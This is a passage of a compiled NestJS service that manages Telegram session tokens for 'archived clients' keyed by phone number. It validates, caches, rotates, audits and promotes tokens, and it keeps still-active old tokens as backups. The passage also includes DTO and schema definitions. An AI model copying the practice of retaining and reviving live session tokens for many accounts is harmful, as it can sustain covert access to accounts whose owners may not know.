            return await this.archivedclientModel.find(query).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async backupCurrentSession(archivedClient) {
        const currentSession = archivedClient.session;
        const oldSessions = archivedClient.oldSessions || [];
        oldSessions.push(currentSession);
        if (oldSessions.length > this.MAX_OLD_SESSIONS) {
            oldSessions.splice(0, oldSessions.length - this.MAX_OLD_SESSIONS);
        }
        return { oldSessions };
    }
    async isSessionActive(mobile, session) {
        if (!session || session.trim().length === 0) {
            return false;
        }
        const cacheKey = `${mobile}:${session.substring(0, 20)}`;
        const cached = this.SESSION_VALIDATION_CACHE.get(cacheKey);
        if (cached && (Date.now() - cached.timestamp) < this.CACHE_EXPIRY) {
            this.logger.debug(`Using cached session validation for ${mobile}`);
            return cached.isValid;
        }
        let isActive = false;
        try {
            this.logger.debug(`Validating session for ${mobile}...`);
            this.logger.debug(`Attempting connection validation for ${mobile}`);
            const connectionTimeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 10000));
            await Promise.race([
                connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: true, handler: false }),
                connectionTimeout
            ]);
            isActive = true;
            this.logger.debug(`Connection validation successful for ${mobile}`);
        }
        catch (error) {
            isActive = false;
            this.logger.debug(`Session validation failed for ${mobile}: ${error.message}`);
        }
        finally {
            await this.safeCleanupConnection(mobile);
        }
        this.SESSION_VALIDATION_CACHE.set(cacheKey, {
            isValid: isActive,
            timestamp: Date.now()
        });
        if (this.SESSION_VALIDATION_CACHE.size > 1000) {
            this.cleanupValidationCache();
        }
        return isActive;
    }
    cleanupValidationCache() {
        const now = Date.now();
        for (const [key, value] of this.SESSION_VALIDATION_CACHE.entries()) {
            if (now - value.timestamp > this.CACHE_EXPIRY) {
                this.SESSION_VALIDATION_CACHE.delete(key);
            }
        }
        this.logger.debug(`Cleaned up validation cache, remaining entries: ${this.SESSION_VALIDATION_CACHE.size}`);
    }
    async updateSession(mobile, newSession) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        if (!newSession || newSession.trim().length === 0) {
            throw new common_1.BadRequestException('New session token is required and cannot be empty');
        }
        this.logger.log(`Updating session for mobile: ${mobile}`);
        try {
            const archivedClient = await this.findOne(mobile);
            if (!archivedClient) {
                throw new common_1.NotFoundException(`Archived client with mobile "${mobile}" not found`);
            }
            const isNewSessionValid = await this.isSessionActive(mobile, newSession);
            if (!isNewSessionValid) {
                this.logger.warn(`New session provided for ${mobile} is not valid`);
            }
            const updateData = {
                session: newSession,
                lastUpdated: new Date()
            };
            try {
                const isCurrentSessionActive = await this.isSessionActive(mobile, archivedClient.session);
                if (isCurrentSessionActive && archivedClient.session !== newSession) {
                    this.logger.log(`Current session for ${mobile} is active, backing up before update`);
                    const backupData = await this.backupCurrentSession(archivedClient);
                    updateData.oldSessions = backupData.oldSessions;
                    await this.auditSessionAccess(mobile, archivedClient.session, 'session_backed_up_before_update');
                }
                else {
                    this.logger.log(`Current session for ${mobile} is inactive, replacing without backup`);
                }
            }
            catch (error) {
                this.logger.warn(`Could not verify current session status for ${mobile}, proceeding with update:`, error.message);
            }
            const updatedClient = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateData }, {
                new: true,
                upsert: false,
                runValidators: true
            }).exec();
            if (!updatedClient) {
                throw new common_1.NotFoundException(`Failed to update archived client with mobile "${mobile}"`);
            }
            this.clearCacheForMobile(mobile);
            await this.auditSessionAccess(mobile, newSession, 'session_manually_updated');
            this.logger.log(`Successfully updated session for mobile: ${mobile}`);
            return updatedClient;
        }
        catch (error) {
            this.logger.error(`Failed to update session for mobile ${mobile}:`, error);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException(`Session update failed: ${error.message}`);
        }
    }
    clearCacheForMobile(mobile) {
        const keysToDelete = [];
        for (const key of this.SESSION_VALIDATION_CACHE.keys()) {
            if (key.startsWith(`${mobile}:`)) {
                keysToDelete.push(key);
            }
        }
        keysToDelete.forEach(key => this.SESSION_VALIDATION_CACHE.delete(key));
        this.logger.debug(`Cleared ${keysToDelete.length} cache entries for mobile: ${mobile}`);
    }
    async getOldSessions(mobile) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        const archivedClient = await this.findOne(mobile);
        if (!archivedClient) {
            throw new common_1.NotFoundException(`Archived client with mobile "${mobile}" not found`);
        }
        console.log(`Retrieved ${archivedClient.oldSessions?.length || 0} old sessions for ${mobile}`);
        return archivedClient.oldSessions || [];
    }
    async cleanupOldSessions(mobile, maxSessions = 5) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        if (maxSessions < 0 || maxSessions > 20) {
            throw new common_1.BadRequestException('maxSessions must be between 0 and 20');
        }
        this.logger.log(`Starting session cleanup for mobile: ${mobile}, maxSessions: ${maxSessions}`);
        try {
            const archivedClient = await this.findOne(mobile);
            if (!archivedClient) {
                throw new common_1.NotFoundException(`Archived client with mobile "${mobile}" not found`);
            }
            const oldSessions = archivedClient.oldSessions || [];
            if (oldSessions.length === 0) {
                this.logger.log(`No old sessions found for ${mobile}, cleanup not needed`);
                return archivedClient;
            }
            this.logger.log(`Analyzing ${oldSessions.length} old sessions for ${mobile}...`);
            const sessionAnalysis = {
                active: [],
                inactive: [],
                failed: []
            };
            const sessionPromises = oldSessions.map(async (session, index) => {
                try {
                    await (0, Helpers_1.sleep)(100 * index);
                    const isActive = await this.isSessionActive(mobile, session);
                    const sessionId = session.substring(0, 10) + '...';
                    if (isActive) {
                        sessionAnalysis.active.push(session);
                        this.logger.debug(`Session ${sessionId} is active`);
                    }
                    else {
                        sessionAnalysis.inactive.push(session);
                        this.logger.debug(`Session ${sessionId} is inactive`);
                    }
                }
                catch (error) {
                    sessionAnalysis.failed.push(session);
                    this.logger.warn(`Session check failed for ${session.substring(0, 10)}...:`, error.message);
                }
            });
            await Promise.all(sessionPromises);
            let finalActiveSessions = sessionAnalysis.active;
            if (sessionAnalysis.active.length > maxSessions) {
                finalActiveSessions = sessionAnalysis.active.slice(-maxSessions);
                const removedCount = sessionAnalysis.active.length - maxSessions;
                this.logger.log(`Limiting active sessions from ${sessionAnalysis.active.length} to ${maxSessions}, removing ${removedCount} oldest`);
            }
            const totalRemovedCount = sessionAnalysis.inactive.length + sessionAnalysis.failed.length +
                (sessionAnalysis.active.length - finalActiveSessions.length);
            if (totalRemovedCount === 0) {
                this.logger.log(`No cleanup needed for ${mobile}, all ${oldSessions.length} sessions are active and within limit`);
                return archivedClient;
            }
            const updatedClient = await this.archivedclientModel.findOneAndUpdate({ mobile }, {
                $set: {
                    oldSessions: finalActiveSessions,
                    lastCleanup: new Date()
                }
            }, { new: true }).exec();
            await this.auditSessionAccess(mobile, 'cleanup_operation', `removed_${totalRemovedCount}_sessions`);
            const summary = {
                total: oldSessions.length,
                active: sessionAnalysis.active.length,
                inactive: sessionAnalysis.inactive.length,
                failed: sessionAnalysis.failed.length,
                kept: finalActiveSessions.length,
                removed: totalRemovedCount
            };
            this.logger.log(`Session cleanup completed for ${mobile}:`, summary);
            return updatedClient;
        }
        catch (error) {
            this.logger.error(`Session cleanup failed for mobile ${mobile}:`, error);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException(`Session cleanup failed: ${error.message}`);
        }
    }
    async getSessionStatus(mobile) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.log(`Getting comprehensive session status for mobile: ${mobile}`);
        try {
            const archivedClient = await this.findOne(mobile);
            if (!archivedClient) {
                throw new common_1.NotFoundException(`Archived client with mobile "${mobile}" not found`);
            }
            const isMainActive = await this.isSessionActive(mobile, archivedClient.session);
            let activeOldSessions = 0;
            if (archivedClient.oldSessions && archivedClient.oldSessions.length > 0) {
                const healthCheckPromises = archivedClient.oldSessions.slice(0, 3).map(async (session) => {
                    try {
                        return await this.isSessionActive(mobile, session);
                    }
                    catch {
                        return false;
                    }
                });
                const results = await Promise.all(healthCheckPromises);
                activeOldSessions = results.filter(Boolean).length;
            }
            let reliability = 'low';
            if (isMainActive && activeOldSessions >= 2) {
                reliability = 'high';
            }
            else if (isMainActive || activeOldSessions >= 1) {
                reliability = 'medium';
            }
            const lastUpdated = archivedClient.lastUpdated || archivedClient.createdAt || new Date();
            const sessionAge = this.calculateSessionAge(lastUpdated);
            const result = {
                mobile,
                isMainSessionActive: isMainActive,
                totalOldSessions: archivedClient.oldSessions?.length || 0,
                lastChecked: new Date().toISOString(),
                healthMetrics: {
                    activeOldSessions,
                    lastUpdated: lastUpdated.toISOString(),
                    sessionAge,
                    reliability
                }
            };
            this.logger.log(`Session status check completed for ${mobile}, reliability: ${reliability}`);
            return result;
        }
        catch (error) {
            this.logger.error(`Failed to get session status for mobile ${mobile}:`, error);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException(`Session status check failed: ${error.message}`);
        }
    }
    calculateSessionAge(lastUpdated) {
        const now = new Date();
        const diffMs = now.getTime() - lastUpdated.getTime();
        const diffMins = Math.floor(diffMs / (1000 * 60));
        const diffHours = Math.floor(diffMins / 60);
        const diffDays = Math.floor(diffHours / 24);
        if (diffDays > 0) {
            return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;
        }
        else if (diffHours > 0) {
            return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;
        }
        else if (diffMins > 0) {
            return `${diffMins} minute${diffMins > 1 ? 's' : ''} ago`;
        }
        else {
            return 'Just now';
        }
    }
    async batchFetchSessions(mobiles) {
        if (!mobiles || mobiles.length === 0) {
            throw new common_1.BadRequestException('Mobile numbers array is required');
        }
        if (mobiles.length > 50) {
            throw new common_1.BadRequestException('Batch size cannot exceed 50 mobiles');
        }
        this.logger.log(`Batch session factory request for ${mobiles.length} mobiles`);
        const results = await Promise.allSettled(mobiles.map(async (mobile) => {
            try {
                const client = await this.fetchOne(mobile);
                return { mobile, client };
            }
            catch (error) {
                return { mobile, client: null, error: error.message };
            }
        }));
        return results.map((result, index) => {
            if (result.status === 'fulfilled') {
                return result.value;
            }
            else {
                return {
                    mobile: mobiles[index],
                    client: null,
                    error: result.reason?.message || 'Unknown error'
                };
            }
        });
    }
    async createNewClientWithSession(mobile) {
        let attempt = 0;
        let lastError;
        while (attempt < this.MAX_RETRY_ATTEMPTS) {
            try {
                attempt++;
                this.logger.log(`Creating new session for ${mobile}, attempt ${attempt}/${this.MAX_RETRY_ATTEMPTS}`);
                const newSession = await Promise.race([
                    this.generateNewSession(mobile),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Session generation timeout')), this.SESSION_GENERATION_TIMEOUT))
                ]);
                const newClient = await this.create({
                    session: newSession,
                    mobile: mobile,
                    oldSessions: []
                });
                await this.auditSessionAccess(mobile, newSession, 'new_client_created');
                this.logger.log(`Successfully created new client with session for ${mobile}`);
                return newClient;
            }
            catch (error) {
                lastError = error;
                this.logger.warn(`Attempt ${attempt} failed for new client ${mobile}:`, error.message);
                if (attempt < this.MAX_RETRY_ATTEMPTS) {
                    await (0, Helpers_1.sleep)(1000 * attempt);
                }
            }
            finally {
                await this.safeCleanupConnection(mobile);
            }
        }
        throw new common_1.InternalServerErrorException(`Failed to create new client after ${this.MAX_RETRY_ATTEMPTS} attempts: ${lastError.message}`);
    }
    async generateAndUpdateSession(mobile, existingClient) {
        let attempt = 0;
        let lastError;
        while (attempt < this.MAX_RETRY_ATTEMPTS) {
            try {
                attempt++;
                this.logger.log(`Generating new session for existing client ${mobile}, attempt ${attempt}/${this.MAX_RETRY_ATTEMPTS}`);
                const newSession = await Promise.race([
                    this.generateNewSession(mobile),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Session generation timeout')), this.SESSION_GENERATION_TIMEOUT))
                ]);
                await this.backupSessionToHistory(mobile, existingClient.session, 'session_replaced');
                const updatedClient = await this.archivedclientModel.findOneAndUpdate({ mobile }, {
                    $set: {
                        session: newSession,
                        lastUpdated: new Date()
                    },
                    $push: {
                        oldSessions: {
                            $each: [existingClient.session],
                            $slice: -this.MAX_OLD_SESSIONS
                        }
                    }
                }, { new: true }).exec();
                await this.auditSessionAccess(mobile, newSession, 'new_session_generated');
                this.logger.log(`Successfully generated new session for ${mobile}`);
                return updatedClient;
            }
            catch (error) {
                lastError = error;
                this.logger.warn(`Attempt ${attempt} failed for session generation ${mobile}:`, error.message);
                if (attempt < this.MAX_RETRY_ATTEMPTS) {
                    await (0, Helpers_1.sleep)(1000 * attempt);
                }
            }
            finally {
                await this.safeCleanupConnection(mobile);
            }
        }
        throw new common_1.InternalServerErrorException(`Failed to generate session after ${this.MAX_RETRY_ATTEMPTS} attempts: ${lastError.message}`);
    }
    async findActiveSessionFromHistory(archivedClient) {
        const oldSessions = archivedClient.oldSessions || [];
        if (oldSessions.length === 0) {
            return null;
        }
        for (let i = oldSessions.length - 1; i >= 0; i--) {
            const session = oldSessions[i];
            try {
                this.logger.log(`Checking session ${i + 1}/${oldSessions.length} for ${archivedClient.mobile}`);
                const isActive = await this.isSessionActive(archivedClient.mobile, session);
                if (isActive) {
                    this.logger.log(`Found active session in history for ${archivedClient.mobile}`);
                    return session;
                }
            }
            catch (error) {
                this.logger.warn(`Failed to check session ${i + 1} for ${archivedClient.mobile}:`, error.message);
            }
        }
        return null;
    }
    async promoteActiveSession(mobile, activeSession, archivedClient) {
        try {
            const updatedOldSessions = (archivedClient.oldSessions || []).filter(s => s !== activeSession);
            if (archivedClient.session !== activeSession) {
                updatedOldSessions.unshift(archivedClient.session);
            }
            const trimmedOldSessions = updatedOldSessions.slice(0, this.MAX_OLD_SESSIONS);
            const updatedClient = await this.archivedclientModel.findOneAndUpdate({ mobile }, {
                $set: {
                    session: activeSession,
                    oldSessions: trimmedOldSessions,
                    lastUpdated: new Date()
                }
            }, { new: true }).exec();
            await this.auditSessionAccess(mobile, activeSession, 'session_promoted_from_history');
            this.logger.log(`Successfully promoted session from history for ${mobile}`);
            return updatedClient;
        }
        catch (error) {
            this.logger.error(`Failed to promote session for ${mobile}:`, error);
            throw new common_1.InternalServerErrorException(`Failed to promote session: ${error.message}`);
        }
    }
    async generateNewSession(mobile) {
        try {
            await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: true, handler: false });
            const newSession = await this.telegramService.createNewSession(mobile);
            if (!newSession || newSession.trim().length === 0) {
                throw new Error('Generated session is empty or invalid');
            }
            return newSession;
        }
        catch (error) {
            this.logger.error(`Session generation failed for ${mobile}:`, error);
            throw error;
        }
    }
    async auditSessionAccess(mobile, session, action) {
        try {
            await this.archivedclientModel.findOneAndUpdate({ mobile }, {
                $push: {
                    sessionHistory: {
                        $each: [{
                                session: session.substring(0, 20) + '...',
                                action,
                                timestamp: new Date(),
                                status: 'active'
                            }],
                        $slice: -50
                    }
                }
            }, { upsert: false }).exec();
        }
        catch (error) {
            this.logger.warn(`Failed to audit session access for ${mobile}:`, error.message);
        }
    }
    async backupSessionToHistory(mobile, session, reason) {
        try {
            await this.auditSessionAccess(mobile, session, `backup_${reason}`);
        }
        catch (error) {
            this.logger.warn(`Failed to backup session to history for ${mobile}:`, error.message);
        }
    }
    async safeCleanupConnection(mobile) {
        try {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
        catch (error) {
            this.logger.warn(`Failed to cleanup connection for ${mobile}:`, error.message);
        }
    }
    getCacheStatistics() {
        const now = Date.now();
        let validEntries = 0;
        let expiredEntries = 0;
        for (const [, value] of this.SESSION_VALIDATION_CACHE.entries()) {
            if (now - value.timestamp < this.CACHE_EXPIRY) {
                validEntries++;
            }
            else {
                expiredEntries++;
            }
        }
        const totalEntries = this.SESSION_VALIDATION_CACHE.size;
        const cacheHitRate = totalEntries > 0 ?
            Math.round((validEntries / totalEntries) * 100) + '%' : '0%';
        return {
            totalEntries,
            validEntries,
            expiredEntries,
            cacheHitRate,
            lastCleanup: new Date().toISOString()
        };
    }
};
exports.ArchivedClientService = ArchivedClientService;
exports.ArchivedClientService = ArchivedClientService = ArchivedClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('ArchivedClient')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], ArchivedClientService);


/***/ }),

/***/ "./src/components/archived-clients/dto/cleanup-sessions.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/archived-clients/dto/cleanup-sessions.dto.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CleanupSessionsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CleanupSessionsDto {
}
exports.CleanupSessionsDto = CleanupSessionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        example: 5,
        description: 'Maximum number of old sessions to keep',
        minimum: 0,
        maximum: 20,
        default: 5,
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.Max)(20),
    __metadata("design:type", Number)
], CleanupSessionsDto.prototype, "maxSessions", void 0);


/***/ }),

/***/ "./src/components/archived-clients/dto/create-archived-client.dto.ts":
/*!***************************************************************************!*\
  !*** ./src/components/archived-clients/dto/create-archived-client.dto.ts ***!
  \***************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateArchivedClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateArchivedClientDto {
}
exports.CreateArchivedClientDto = CreateArchivedClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateArchivedClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Current session token' }),
    __metadata("design:type", String)
], CreateArchivedClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['1BQANOTEuM==', '2CRANOTEuN=='], description: 'Array of old session tokens', required: false, type: [String] }),
    __metadata("design:type", Array)
], CreateArchivedClientDto.prototype, "oldSessions", void 0);


/***/ }),

/***/ "./src/components/archived-clients/dto/session-status.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/archived-clients/dto/session-status.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionStatusDto = exports.SessionHealthMetricsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SessionHealthMetricsDto {
}
exports.SessionHealthMetricsDto = SessionHealthMetricsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        example: 2,
        description: 'Number of active old sessions available as backup'
    }),
    __metadata("design:type", Number)
], SessionHealthMetricsDto.prototype, "activeOldSessions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: '2024-01-15T08:30:00.000Z',
        description: 'Timestamp when the session was last updated'
    }),
    __metadata("design:type", String)
], SessionHealthMetricsDto.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: '2 hours ago',
        description: 'Human-readable session age'
    }),
    __metadata("design:type", String)
], SessionHealthMetricsDto.prototype, "sessionAge", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: 'high',
        description: 'Session reliability rating based on availability',
        enum: ['high', 'medium', 'low']
    }),
    __metadata("design:type", String)
], SessionHealthMetricsDto.prototype, "reliability", void 0);
class SessionStatusDto {
}
exports.SessionStatusDto = SessionStatusDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        example: '916265240911',
        description: 'Mobile number of the archived client'
    }),
    __metadata("design:type", String)
], SessionStatusDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: true,
        description: 'Whether the main session is currently active'
    }),
    __metadata("design:type", Boolean)
], SessionStatusDto.prototype, "isMainSessionActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: 3,
        description: 'Total number of old sessions stored'
    }),
    __metadata("design:type", Number)
], SessionStatusDto.prototype, "totalOldSessions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: '2024-01-15T10:30:00.000Z',
        description: 'Timestamp when the status was last checked'
    }),
    __metadata("design:type", String)
], SessionStatusDto.prototype, "lastChecked", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Detailed health metrics for the session',
        type: SessionHealthMetricsDto
    }),
    __metadata("design:type", SessionHealthMetricsDto)
], SessionStatusDto.prototype, "healthMetrics", void 0);


/***/ }),

/***/ "./src/components/archived-clients/dto/session-update.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/archived-clients/dto/session-update.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionUpdateDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SessionUpdateDto {
}
exports.SessionUpdateDto = SessionUpdateDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        example: '1BQANOTEuMTA4LjUg==',
        description: 'New session token to set as primary session'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SessionUpdateDto.prototype, "newSession", void 0);


/***/ }),

/***/ "./src/components/archived-clients/schemas/archived-client.schema.ts":
/*!***************************************************************************!*\
  !*** ./src/components/archived-clients/schemas/archived-client.schema.ts ***!
  \***************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientSchema = exports.ArchivedClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let ArchivedClient = class ArchivedClient {
};
exports.ArchivedClient = ArchivedClient;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Mobile number of the archived user' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ArchivedClient.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Current session token of the archived user' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ArchivedClient.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['1BQANOTEuM==', '2CRANOTEuN=='], description: 'Array of old session tokens' }),
    (0, mongoose_1.Prop)({ type: [String], default: [] }),
    __metadata("design:type", Array)
], ArchivedClient.prototype, "oldSessions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last time the session was updated' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], ArchivedClient.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last time sessions were cleaned up' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], ArchivedClient.prototype, "lastCleanup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session history for auditing purposes' }),
    (0, mongoose_1.Prop)({
        type: [{
                session: String,
                action: String,
                timestamp: { type: Date, default: Date.now },
                status: String,
                source: String
            }],
        default: []
    }),
    __metadata("design:type", Array)
], ArchivedClient.prototype, "sessionHistory", void 0);
exports.ArchivedClient = ArchivedClient = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'archivedClients',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ArchivedClient);
exports.ArchivedClientSchema = mongoose_1.SchemaFactory.createForClass(ArchivedClient);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.controller.ts":
/*!*******************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.controller.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./dto/create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
const search_buffer__client_dto_1 = __webpack_require__(/*! ./dto/search-buffer- client.dto */ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts");
const update_buffer_client_dto_1 = __webpack_require__(/*! ./dto/update-buffer-client.dto */ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts");
let BufferClientController = class BufferClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async updateInfo() {
